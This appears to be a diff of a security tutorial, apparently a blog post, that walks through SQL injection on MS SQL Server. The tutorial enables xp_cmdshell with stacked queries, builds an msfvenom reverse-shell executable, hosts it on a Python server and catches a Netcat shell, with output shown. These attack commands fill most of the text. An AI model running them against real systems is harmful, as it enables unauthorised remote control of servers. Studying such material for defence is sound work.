@@ -12,12 +12,13 @@ SQL injection (SQLi) is a common web security vulnerability. It allows an attack
 
 As a quick refresher on SQLi, I will illustrate a marketplace built with PHP that allows users to delete one of their products. The client will send a `DELETE /products/PROD_ID` request. Server-side, a `$productId` variable is initialized with the value of the `PROD_ID` parameter. It will send this query to the DB:  
 
-```
+```sql
 DELETE * FROM products WHERE id = '$productId'; 
 ```
+
 A malicious user can send this parameter `' OR 1=1--`. If the server does not sanitize and validate this input, it results in the following query. Doing this triggers the deletion of all products:
 
-```
+```sql
 DELETE * FROM products WHERE id = '' OR 1=1--';
 ```
 
@@ -32,13 +33,13 @@ Sometimes, xp_cmdshell can be enabled via `EXEC` queries if the user has:
 
 An attacker might enable it by using [batched (or stacked) queries](https://portswigger.net/web-security/sql-injection/cheat-sheet) and injecting the following configuration options:
 
-```
+```sql
 '; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --
 ```
 
 From the [documentation](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option?view=sql-server-ver16<):
 
-```
+```sql
 EXEC sp_configure 'show advanced options', 1;
 RECONFIGURE;
 EXEC sp_configure 'xp_cmdshell', 1;
@@ -62,7 +63,7 @@ Now that the attacker has detected a SQLi vulnerability and can access xp_cmdshe
 ### First step
 I will use MSFVenom to create our payload (change `MY_LISTENER_IP_ADDR` to your own).
 
-```
+```shell
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=MY_LISTENER_IP_ADDR LPORT=4444 -f exe -o rshell.exe
 ```
 
@@ -71,7 +72,7 @@ A new file called **rshell.exe** has been created.
 ### Second step
 To serve this file, I will start a Python server:
 
-```
+```shell
 python3 -m http.server 8000
 ```
 
@@ -80,7 +81,7 @@ All files in my current directory are now accessible to download on the target m
 ### Third step
 I set up a listener using the **Netcat** utility, listening for connections from the target machine on port 4444
 
-```
+```shell
 nc -lnvp 4444
 ```
 
@@ -93,8 +94,8 @@ Using the SQLi vector, I can run the **xp_cmdshell** utility to download and exe
 
 I checked my Python server's output:
 
-```
-$ python3 -m http.server 8000
+```shell
+python3 -m http.server 8000
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 MACHINE_IP - - [01/Jan/2024 10:15:01] "GET /rshel.exe HTTP/1.1" 200 -
 ```
@@ -102,7 +103,7 @@ MACHINE_IP - - [01/Jan/2024 10:15:01] "GET /rshel.exe HTTP/1.1" 200 -
 Suggesting that the target machine fetched my file. Now, if everything goes well, my Netcat listener should have a reverse shell connection:
 
 ```
-$ nc -lnvp 4444
+nc -lnvp 4444
 listening on [any] 4444 ...
 connect to [99.99.99.99] from (UNKNOWN) [MACHINE_IP] 49730
 Microsoft Windows [Version 10.0.13143.1731]
